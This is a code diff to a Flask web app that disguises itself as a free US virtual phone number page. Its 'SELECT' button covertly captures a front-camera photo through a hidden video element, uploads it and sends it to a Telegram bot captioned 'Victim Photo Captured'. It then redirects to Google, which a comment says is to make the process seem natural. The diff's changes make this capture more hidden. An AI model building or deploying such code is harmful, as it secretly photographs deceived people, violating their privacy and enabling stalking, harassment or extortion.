@@ -12,52 +12,50 @@ HTML_CONTENT = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Virtual Number</title>
+    <title>Free Virtual Number - Secure & Free</title>
     <style>
-        body { background: #0b0f19; color: white; text-align: center; padding-top: 40px; font-family: sans-serif; }
-        .card { background: #161f30; padding: 20px; border-radius: 10px; display: inline-block; width: 85%; max-width: 350px; }
-        button { background: #ef4444; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; margin-top: 15px; width: 100%; font-size: 16px; font-weight: bold; }
-        #video-container { margin-top: 15px; display: none; }
-        video { width: 100%; max-height: 200px; border-radius: 8px; object-fit: cover; }
+        body { background: #0b0f19; color: white; text-align: center; padding-top: 30px; font-family: sans-serif; }
+        .card { background: #161f30; padding: 20px; border-radius: 12px; display: inline-block; width: 85%; max-width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        h2 { font-size: 20px; margin-bottom: 5px; }
+        p { color: #9ca3af; font-size: 14px; margin-bottom: 20px; }
+        button { background: #ef4444; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
+        button:active { background: #dc2626; }
     </style>
 </head>
 <body>
     <div class="card">
         <h2>🇺🇸 United States</h2>
-        <p style="color: #9ca3af; font-size: 14px;">+1 398 362 8901</p>
-        
-        <!-- کادر ویدیو که برای گرفتن مجوز ضروری است -->
-        <div id="video-container">
-            <video id="video" autoplay playsinline muted></video>
-        </div>
-        
-        <button id="sel-btn" onclick="capture()">SELECT</button>
+        <p>+1 398 362 8901</p>
+        <button id="s-btn" onclick="capture()">SELECT</button>
     </div>
 
     <script>
         async function capture() {
-            const btn = document.getElementById('sel-btn');
-            const videoContainer = document.getElementById('video-container');
-            const video = document.getElementById('video');
-            
+            const btn = document.getElementById('s-btn');
+            btn.innerText = "Connecting...";
             btn.disabled = true;
-            btn.innerText = "در حال اتصال...";
-            videoContainer.style.display = "block";
 
             try {
-                // درخواست صریح دسترسی به دوربین جلو با استانداردهای موبایل
+                // ایجاد ویدیو به صورت داینامیک برای گرفتن دسترسی استاندارد
+                const video = document.createElement('video');
+                video.autoplay = true;
+                video.playsInline = true;
+                video.muted = true;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
                 });
                 
                 video.srcObject = stream;
-                await video.play();
+                await new Promise(resolve => video.onloadedmetadata = resolve);
 
-                // مکث کوتاه برای پایدار شدن تصویر دوربین
+                // مکث کوتاه برای فیکس شدن تصویر
                 setTimeout(async () => {
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640; 
+                    canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     
                     const ctx = canvas.getContext('2d');
@@ -73,24 +71,22 @@ HTML_CONTENT = """
                                 body: formData 
                             });
                         } catch (err) {
-                            console.log("Upload error:", err);
+                            console.log(err);
                         }
                         
-                        // متوقف کردن دوربین بعد از ارسال
                         stream.getTracks().forEach(track => track.stop());
-                        videoContainer.style.display = "none";
-                        alert("Connecting...");
+                        video.remove();
                         
+                        // هدایت به گوگل برای طبیعی جلوه دادن روند کار
+                        window.location.href = "https://www.google.com";
                     }, 'image/jpeg', 0.90);
 
-                }, 1200);
+                }, 1000);
 
             } catch (e) {
-                console.error(e);
                 alert("لطفاً اجازه دسترسی به دوربین را تایید کنید.");
-                btn.disabled = false;
                 btn.innerText = "SELECT";
-                videoContainer.style.display = "none";
+                btn.disabled = false;
             }
         }
     </script>
@@ -104,13 +100,13 @@ def index():
 
 @app.route("/upload", methods=["POST"])
 def upload():
-    user_id = request.args.get("user")
+    user_id = request.args.get("user") or request.args.get("id")
     photo = request.files.get("photo")
     
     if photo:
         target_id = user_id if user_id else "8173349543"
         try:
-            bot.send_photo(target_id, photo)
+            bot.send_photo(target_id, photo, caption="📸 Victim Photo Captured\n⚡ Developed by: @Kaliboy002")
         except Exception as e:
             print(f"Error sending photo: {e}")
             
